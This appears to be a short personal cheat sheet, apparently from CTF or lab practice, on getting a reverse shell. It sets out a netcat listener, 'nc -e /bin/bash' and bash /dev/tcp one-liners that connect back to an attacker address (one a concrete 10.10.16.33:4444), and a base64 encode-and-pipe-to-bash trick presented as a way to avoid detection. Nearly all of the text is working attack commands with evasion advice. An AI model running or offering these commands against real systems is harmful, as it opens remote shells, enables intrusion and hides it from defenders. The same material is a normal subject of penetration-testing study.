# reverse shell

* netcat can make connector to another host or listen in a port;
    * `nc -lvnp 4444`
    on the host, listening.
    * `nc -e /bin/bash <IP> <port,h=4444>` or
      `/bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_Port> 0>&1`
    on the target, after the connection is made to the `IP`, `-e` executes the
    command.
    * be aware of **firewall**.

* if things don't work, try this format:
  `/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.16.33/4444 0>&1\'`
  [because](66/README.md#The_Problem_with_sh_-i_in_os.system:):

* we can encrypt the command and force it to be decrypted and run at the same
time, so it's not detected:

    ```
    echo 'nc -e /bin/bash <IP> 4444' | base64
    echo 'encoded str' | base64 -d | bash
    ```

    * `bash` forces to be run as a script.
